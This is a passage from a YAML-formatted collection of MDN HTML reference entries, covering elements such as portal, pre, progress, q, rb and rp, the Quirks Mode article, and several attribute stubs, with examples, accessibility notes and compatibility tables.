[`:popover-open`](https://developer.mozilla.org/en-US/docs/Web/CSS/:popover-open) CSS pseudo-class\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/popover](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/popover)"
- name: portal
  summary: 'Experimental: This is an experimental technologyCheck the Browser compatibility table carefully before using this in production'
  description: "# \\<portal\\>: The Portal element\n\n**Experimental:** **This is an [experimental technology](https://developer.mozilla.org/en-US/docs/MDN/Writing_guidelines/Experimental_deprecated_obsolete#experimental)**  \nCheck the [Browser compatibility table](#browser_compatibility) carefully before using this in production.\n\nThe `<portal>` [HTML](../index) element enables the embedding of another HTML page into the current one for the purposes of allowing smoother navigation into new pages.\n\nA `<portal>` is similar to an `<iframe>`. An `<iframe>` allows a separate [browsing context](https://developer.mozilla.org/en-US/docs/Glossary/Browsing_context) to be embedded. However, the embedded content of a `<portal>` is more limited than that of an `<iframe>`. It cannot be interacted with, and therefore is not suitable for embedding widgets into a document. Instead, the `<portal>` acts as a preview of the content of another page. It can be navigated into therefore allowing for seamless transition to the embedded content.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`referrerpolicy`](#referrerpolicy)  \nSets the [referrer policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) to use when requesting the page at the URL given as the value of the `src` attribute.\n\n[`src`](#src)  \nThe URL of the page to embed.\n\n## Accessibility\n\nThe preview displayed by a `<portal>` is not interactive, therefore does not receive input events or focus. Therefore the embedded contents of the portal are not exposed as elements in the [accessibility tree](https://developer.mozilla.org/en-US/docs/Glossary/Accessibility_tree). The portal can be navigated to and activated like a button, the default behavior when clicking on the portal is to activate it.\n\nPortals are given a default label which is the title of the embedded page. If no title is present the visible text in the preview is concatenated to create a label. The [`aria-label`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-label) attribute can be used to override this.\n\nPortals used for prerendering only should be hidden with the hidden HTML attribute or the CSS [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) property with a value of `none`.\n\nWhen using animations during portal activation the [`prefers-reduced-motion`](https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-reduced-motion) [media feature](https://developer.mozilla.org/en-US/docs/Web/CSS/@media#media_features) should be respected.\n\n## Examples\n\n### Basic example\n\nThe following example will embed the contents of `https://example.com` as a preview.\n\nhtml\n\n```\n<portal id=\"exampleportal\" src=\"https://example.com/\"></portal>\n```\n\n## Technical summary\n\n|                    |                                                                                             |\n|--------------------|---------------------------------------------------------------------------------------------|\n| Implicit ARIA role | [button](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/button_role) |\n| DOM interface      | `HTMLPortalElement`                                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `portal` | 85      | 90   | No      | 73    | No     | 85             | No                  | No            | No            | No               | No              |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/portal](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/portal)"
- name: poster (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`poster`](element/video#poster)

    [`<video>`](element/video)

    A URL indicating a poster frame to show until the user plays or seeks.
- name: pre
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<pre\\>: The Preformatted Text element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fpre&level=high)\n\nThe `<pre>` [HTML](../index) element represents preformatted text which is to be presented exactly as written in the HTML file. The text is typically rendered using a non-proportional, or [monospaced](https://en.wikipedia.org/wiki/Monospaced_font), font. Whitespace inside this element is displayed as written.\n\nBy default, `<pre>` is a [block-level](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) element, i.e. its default [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) value is `block`.\n\n## Try it\n\n#### HTML Demo: \\<pre\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <pre>\n      L          TE\n        A       A\n          C    V\n           R A\n           DOU\n           LOU\n          REUSE\n          QUE TU\n          PORTES\n        ET QUI T'\n        ORNE O CI\n         VILISÉ\n        OTE-  TU VEUX\n         LA    BIEN\n        SI      RESPI\n                RER       - Apollinaire\n    </pre>\n\n    pre {\n      font-size: 0.7rem;\n      margin: 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nIf you have to display reserved characters such as `<`, `>`, `&`, and `\"` within the `<pre>` tag, the characters must be escaped using their respective [character references](https://developer.mozilla.org/en-US/docs/Glossary/Character_reference).\n\n`<pre>` elements commonly contain [`<code>`](code), [`<samp>`](samp), and [`<kbd>`](kbd) elements, to represent computer code, computer output, and user input, respectively.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n[`width`](#width) Deprecated Non-standard  \nContains the *preferred* count of characters that a line should have. Though technically still implemented, this attribute has no visual effect; to achieve such an effect, use CSS [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width) instead.\n\n[`wrap`](#wrap) Non-standard Deprecated  \nIs a *hint* indicating how the overflow must happen. In modern browser this hint is ignored and no visual effect results in its present; to achieve such an effect, use CSS [`white-space`](https://developer.mozilla.org/en-US/docs/Web/CSS/white-space) instead.\n\n## Accessibility\n\nIt is important to provide an alternate description for any images or diagrams created using preformatted text. The alternate description should clearly and concisely describe the image or diagram's content.\n\nPeople experiencing low vision conditions and browsing with the aid of assistive technology such as a screen reader may not understand what the preformatted text characters are representing when they are read out in sequence.\n\nA combination of the [`<figure>`](figure) and [`<figcaption>`](figcaption) elements, supplemented by the [ARIA](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA) `role` and [`aria-label`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-label) attributes on the `pre` element allow the preformatted [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII) art to be announced as an image with alternative text, and the `figcaption` serving as the image's caption.\n\n### Example\n\nhtml\n\n```\n<figure>\n  <pre role=\"img\" aria-label=\"ASCII COW\">\n      ___________________________\n  &lt; I'm an expert in my field. &gt;\n      ---------------------------\n          \\   ^__^\n           \\  (oo)\\_______\n              (__)\\       )\\/\\\n                  ||----w |\n                  ||     ||\n  </pre>\n  <figcaption id=\"cow-caption\">\n    A cow saying, \"I'm an expert in my field.\" The cow is illustrated using\n    preformatted text characters.\n  </figcaption>\n</figure>\n```\n\n- [MDN Understanding WCAG, Guideline 1.1 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.1_%E2%80%94_providing_text_alternatives_for_non-text_content)\n- [H86: Providing text alternatives for ASCII art, emoticons, and leetspeak \\| W3C Techniques for WCAG 2.0](https://www.w3.org/TR/WCAG20-TECHS/H86.html)\n\n## Examples\n\n### Basic example\n\n#### HTML\n\nhtml\n\n```\n<p>Using CSS to change the font color is easy.</p>\n<pre><code>\nbody {\n  color: red;\n}\n</code></pre>\n```\n\n#### Result\n\n### Escaping reserved characters\n\n#### HTML\n\nhtml\n\n```\n<pre><code>\nlet i = 5;\n\nif (i &lt; 10 &amp;&amp; i &gt; 0)\n  return &quot;Single Digit Number&quot;\n</code></pre>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                 |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), palpable content.                           |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                           |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                    |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role) |\n| Permitted ARIA roles                        | Any                                                                                             |\n| DOM interface                               | [`HTMLPreElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLPreElement)             |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- CSS: [`white-space`](https://developer.mozilla.org/en-US/docs/Web/CSS/white-space), [`word-break`](https://developer.mozilla.org/en-US/docs/Web/CSS/word-break)\n- [Character reference](https://developer.mozilla.org/en-US/docs/Glossary/Character_reference)\n- Related element: [`<code>`](code), [`<samp>`](samp), [`<kbd>`](kbd)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/pre](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/pre)"
- name: preload (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`preload`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/preload)

    [`<audio>`](element/audio), [`<video>`](element/video)

    Indicates whether the whole resource, parts of it or nothing should be preloaded.
- name: progress
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<progress\\>: The Progress Indicator element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fprogress&level=high)\n\nThe `<progress>` [HTML](../index) element displays an indicator showing the completion progress of a task, typically displayed as a progress bar.\n\n## Try it\n\n#### HTML Demo: \\<progress\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"file\">File progress:</label>\n\n    <progress id=\"file\" max=\"100\" value=\"70\">70%</progress>\n\n    label {\n      padding-right: 10px;\n      font-size: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`max`](../attributes/max)  \nThis attribute describes how much work the task indicated by the `progress` element requires. The `max` attribute, if present, must have a value greater than `0` and be a valid floating point number. The default value is `1`.\n\n[`value`](#value)  \nThis attribute specifies how much of the task that has been completed. It must be a valid floating point number between `0` and `max`, or between `0` and `1` if `max` is omitted. If there is no `value` attribute, the progress bar is indeterminate; this indicates that an activity is ongoing with no indication of how long it is expected to take.\n\n**Note:** Unlike the [`<meter>`](meter) element, the minimum value is always 0, and the `min` attribute is not allowed for the `<progress>` element.\n\n**Note:** The [`:indeterminate`](https://developer.mozilla.org/en-US/docs/Web/CSS/:indeterminate) pseudo-class can be used to match against indeterminate progress bars. To change the progress bar to indeterminate after giving it a value you must remove the value attribute with [`element.removeAttribute('value')`](https://developer.mozilla.org/en-US/docs/Web/API/Element/removeAttribute).\n\n## Accessibility\n\n### Labelling\n\nIn most cases you should provide an accessible label when using `<progress>`. While you can use the standard ARIA labelling attributes [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) or [`aria-label`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-label) as you would for any element with `role=\"progressbar\"`, when using `<progress>` you can alternatively use the [`<label>`](label) element.\n\n**Note:** Text placed between the element's tags is not an accessible label, it is only recommended as a fallback for old browsers that do not support this element.\n\n#### Examples\n\nhtml\n\n```\n<label>\n  Uploading Document: <progress value=\"70\" max=\"100\">70 %</progress>\n</label>\n\n<!-- OR -->\n<br />\n\n<label for=\"progress-bar\">Uploading Document</label>\n<progress id=\"progress-bar\" value=\"70\" max=\"100\">70 %</progress>\n```\n\n#### Result\n\n### Describing a particular region\n\nIf the `<progress>` element is describing the loading progress of a section of a page, use [`aria-describedby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-describedby) to point to the status, and set [`aria-busy=\"true\"`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-busy) on the section that is being updated, removing the `aria-busy` attribute when it has finished loading.\n\n#### Examples\n\nhtml\n\n```\n<div aria-busy=\"true\" aria-describedby=\"progress-bar\">\n  <!-- content is for this region is loading -->\n</div>\n\n<!-- ... -->\n\n<progress id=\"progress-bar\" aria-label=\"Content loading…\"></progress>\n```\n\n##### Result\n\n## Examples\n\nhtml\n\n```\n<progress value=\"70\" max=\"100\">70 %</progress>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), labelable content, [palpable content](../content_categories#palpable_content). |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content), but there must be no `<progress>` element among its descendants.                                                                   |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                          |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                           |\n| Implicit ARIA role                          | [`progressbar`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/progressbar_role)                                                                                        |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                            |\n| DOM interface                               | [`HTMLProgressElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLProgressElement)                                                                                                  |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Creating vertical form controls](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_writing_modes/Vertical_controls)\n- [`<meter>`](meter)\n- [`:indeterminate`](https://developer.mozilla.org/en-US/docs/Web/CSS/:indeterminate)\n- [`-moz-orient`](https://developer.mozilla.org/en-US/docs/Web/CSS/-moz-orient)\n- [`::-moz-progress-bar`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-moz-progress-bar)\n- [`::-webkit-progress-bar`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-webkit-progress-bar)\n- [`::-webkit-progress-value`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-webkit-progress-value)\n- [`::-webkit-progress-inner-element`](https://developer.mozilla.org/en-US/docs/Web/CSS/::-webkit-progress-inner-element)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/progress](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/progress)"
- name: q
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<q\\>: The Inline Quotation element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fq&level=high)\n\nThe `<q>` [HTML](../index) element indicates that the enclosed text is a short inline quotation. Most modern browsers implement this by surrounding the text in quotation marks. This element is intended for short quotations that don't require paragraph breaks; for long quotations use the [`<blockquote>`](blockquote) element.\n\n## Try it\n\n#### HTML Demo: \\<q\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      When Dave asks HAL to open the pod bay door, HAL answers:\n      <q cite=\"https://www.imdb.com/title/tt0062622/quotes/?item=qt0396921&ref_=ext_shr_lnk\">\n        I'm sorry, Dave. I'm afraid I can't do that.\n      </q>\n    </p>\n\n    q {\n      font-style: italic;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`cite`](#cite)  \nThe value of this attribute is a URL that designates a source document or message for the information quoted. This attribute is intended to point to information explaining the context or the reference for the quote.\n\n## Examples\n\nhtml\n\n```\n<p>\n  According to Mozilla's website,\n  <q cite=\"https://www.mozilla.org/en-US/about/history/details/\">\n    Firefox 1.0 was released in 2004 and became a big success.\n  </q>\n</p>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                   |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLQuoteElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLQuoteElement)                                           |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `q`    | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `cite` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- The [`<blockquote>`](blockquote) element for long quotations.\n- The [`<cite>`](cite) element for source citations.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/q](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/q)"
- name: Quirks Mode and Standards Mode
  summary: 'In the old days of the web, pages were typically written in two versions: One for Netscape Navigator, and one for Microsoft Internet Explorer'
  description: "# Quirks Mode\n\nIn the old days of the web, pages were typically written in two versions: One for Netscape Navigator, and one for Microsoft Internet Explorer. When the web standards were made at W3C, browsers could not just start using them, as doing so would break most existing sites on the web. Browsers therefore introduced two modes to treat new standards compliant sites differently from old legacy sites.\n\nThere are now three modes used by the layout engines in web browsers: quirks mode, limited-quirks mode, and no-quirks mode. In **quirks mode**, layout emulates behavior in Navigator 4 and Internet Explorer 5. This is essential in order to support websites that were built before the widespread adoption of web standards. In **no-quirks mode**, the behavior is (hopefully) the desired behavior described by the modern HTML and CSS specifications. In **limited-quirks mode**, there are only a very small number of quirks implemented.\n\nThe limited-quirks and no-quirks modes used to be called \"almost-standards\" mode and \"full standards\" mode, respectively. These names have been changed as the behavior is now standardized.\n\n## How do browsers determine which mode to use?\n\nFor [HTML](index) documents, browsers use a DOCTYPE in the beginning of the document to decide whether to handle it in quirks mode or standards mode. To ensure that your page uses full standards mode, make sure that your page has a DOCTYPE like in this example:\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>Hello World!</title>\n  </head>\n  <body></body>\n</html>\n```\n\nThe DOCTYPE shown in the example, `<!DOCTYPE html>`, is the simplest possible, and the one recommended by current HTML standards. Earlier versions of the HTML standard recommended other variants, but all existing browsers today will use full standards mode for this DOCTYPE. There are no valid reasons to use a more complicated DOCTYPE. If you do use another DOCTYPE, you may risk choosing one which triggers almost standards mode or quirks mode.\n\nPut the DOCTYPE right at the beginning of your HTML document, before any other content.\n\nThe only purpose of `<!DOCTYPE html>` is to activate no-quirks mode. Older versions of HTML standard DOCTYPEs provided additional meaning, but no browser ever used the DOCTYPE for anything other than switching between render modes.\n\nSee also a detailed description of [when different browsers choose various modes](https://hsivonen.fi/doctype/).\n\n### XHTML\n\nIf you serve your page as [XHTML](https://developer.mozilla.org/en-US/docs/Glossary/XHTML) using the `application/xhtml+xml` MIME type in the `Content-Type` HTTP header, you do not need a DOCTYPE to enable standards mode, as such documents always use 'full standards mode'.\n\nIf you serve XHTML-like content using the `text/html` MIME type, browsers will read it as HTML, and you will need the DOCTYPE to use standards mode.\n\n## How do I see which mode is used?\n\nIf the page is rendered in quirks or limited-quirks mode, Firefox will log a warning to the console tab in the developer tools. If this warning is not shown, Firefox is using no-quirks mode.\n\nThe value of `document.compatMode` in JavaScript will show whether or not the document is in quirks mode. If its value is `\"BackCompat\"`, the document is in quirks mode. If it isn't, it will have value `\"CSS1Compat\"`.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Quirks_Mode_and_Standards_Mode](https://developer.mozilla.org/en-US/docs/Web/HTML/Quirks_Mode_and_Standards_Mode)"
- name: rb
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<rb\\>: The Ruby Base element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<rb>` [HTML](../index) element is used to delimit the base text component of a [`<ruby>`](ruby) annotation, i.e. the text that is being annotated. One `<rb>` element should wrap each separate atomic segment of the base text.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Ruby annotations are for showing pronunciation of East Asian characters, like using Japanese furigana or Taiwanese bopomofo characters. The `<rb>` element is used to separate out each segment of the ruby base text.\n- Even though `<rb>` is not a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element), it is common to just include the opening tag of each element in the source code, so that the ruby markup is less complex and easier to read. The browser can then fill in the full element in the rendered version.\n- You need to include one [`<rt>`](rt) element for each base segment/`<rb>` element that you want to annotate.\n\n## Examples\n\n### Using rb\n\nIn this example, we provide an annotation for the original character equivalent of \"Kanji\":\n\nhtml\n\n```\n<ruby>\n  <rb>漢</rb><rb>字 </rb><rp>(</rp><rt>kan</rt><rt>ji</rt><rp>)</rp>\n</ruby>\n```\n\nNote how we've included two `<rb>` elements, to delimit the two separate parts of the ruby base text. The annotation on the other hand is delimited by two [`<rt>`](rt) elements.\n\n#### Result\n\n### Separate annotations\n\nNote that we could also write this example with the two base text parts annotated completely separately. In this case we don't need to include `<rb>` elements:\n\nhtml\n\n```\n<ruby>\n  漢 <rp>(</rp><rt>Kan</rt><rp>)</rp> 字 <rp>(</rp><rt>ji</rt><rp>)</rp>\n</ruby>\n```\n\n#### Result\n\nSee the article about the [`<ruby>`](ruby) element for further examples.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                                                                          |\n| Permitted content                           | As a child of a [`<ruby>`](ruby) element.                                                                                                                                                                      |\n| Tag omission                                | The end tag can be omitted if the element is immediately followed by an [`<rt>`](rt), [`<rtc>`](rtc), or [`<rp>`](rp) element or another `<rb>` element, or if there is no more content in the parent element. |\n| Permitted parents                           | A [`<ruby>`](ruby) element.                                                                                                                                                                                    |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                            |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                                                                  |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<ruby>`](ruby)\n- [`<rt>`](rt)\n- [`<rp>`](rp)\n- [`<rtc>`](rtc)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/rb](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/rb)"
- name: readonly (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`readonly`](attributes/readonly)

    [`<input>`](element/input), [`<textarea>`](element/textarea)

    Indicates whether the element can be edited.
- name: Reference
  summary: This HTML reference describes all elements and attributes of HTML, including global attributes that apply to all elements
  description: "# HTML reference\n\nThis [HTML](index) reference describes all **elements** and **attributes** of HTML, including **global attributes** that apply to all elements.\n\n[HTML element reference](element)  \nThis page lists all the HTML elements, which are created using tags.\n\n[HTML attribute reference](attributes)  \nElements in HTML have attributes; these are additional values that configure the elements or adjust their behavior in various ways to meet the criteria the users want.\n\n[Global attributes](global_attributes)  \nGlobal attributes are attributes common to all HTML elements; they can be used on all elements, though they may have no effect on some elements.\n\n[Content categories](content_categories)  \nEvery HTML element is a member of one or more content categories — these categories group elements that share common characteristics.\n\n[HTML comments](comments)  \nHTML comments are used to add explanatory notes to the markup or to prevent the browser from interpreting specific parts of the document.\n\n[Date and time formats used in HTML](date_and_time_formats)  \nCertain HTML elements allow you to specify dates and/or times as the value or as the value of an attribute. These include the date and time variations of the [`<input>`](element/input) element as well as the [`<ins>`](element/ins) and [`<del>`](element/del) elements.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Reference](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference)"
- name: referrerpolicy (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`referrerpolicy`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/referralpolicy)

    [`<a>`](element/a), [`<area>`](element/area), [`<iframe>`](element/iframe), [`<img>`](element/img), [`<link>`](element/link), [`<script>`](element/script)

    Specifies which referrer is sent when fetching the resource.
- name: rel (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`rel`](attributes/rel)

    [`<a>`](element/a), [`<area>`](element/area), [`<link>`](element/link)

    Specifies the relationship of the target object to the link object.
- name: required (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`required`](attributes/required)

    [`<input>`](element/input), [`<select>`](element/select), [`<textarea>`](element/textarea)

    Indicates whether this element is required to fill out or not.
- name: reversed (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`reversed`](element/ol#reversed)

    [`<ol>`](element/ol)

    Indicates whether the list should be displayed in a descending order instead of an ascending order.
- name: rows (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`rows`](element/textarea#rows)

    [`<textarea>`](element/textarea)

    Defines the number of rows in a text area.
- name: rowspan (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`rowspan`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rowspan)

    [`<td>`](element/td), [`<th>`](element/th)

    Defines the number of rows a table cell should span over.
- name: rp
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<rp\\>: The Ruby Fallback Parenthesis element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Frp&level=high)\n\nThe `<rp>` [HTML](../index) element is used to provide fall-back parentheses for browsers that do not support display of ruby annotations using the [`<ruby>`](ruby) element. One `<rp>` element should enclose each of the opening and closing parentheses that wrap the [`<rt>`](rt) element that contains the annotation's text.\n\n## Try it\n\n#### HTML Demo: \\<rp\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <ruby> 漢 <rp>(</rp><rt>kan</rt><rp>)</rp> 字 <rp>(</rp><rt>ji</rt><rp>)</rp> </ruby>\n\n    ruby {\n      font-size: 2em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Ruby annotations are for showing pronunciation of East Asian characters, like using Japanese furigana or Taiwanese bopomofo characters. The `<rp>` element is used in the case of lack of [`<ruby>`](ruby) element support; the `<rp>` content provides what should be displayed in order to indicate the presence of a ruby annotation, usually parentheses.\n\n## Examples\n\n### Using ruby annotations\n\nThis example uses ruby annotations to display the [Romaji](https://en.wikipedia.org/wiki/Romaji) equivalents for each character.\n\nhtml\n\n```\n<ruby>\n  漢 <rp>(</rp><rt>Kan</rt><rp>)</rp> 字 <rp>(</rp><rt>ji</rt><rp>)</rp>\n</ruby>\n```\n\n#### Result\n\nSee the article about the [`<ruby>`](ruby) element for further examples.\n\n### Without ruby support\n\nIf your 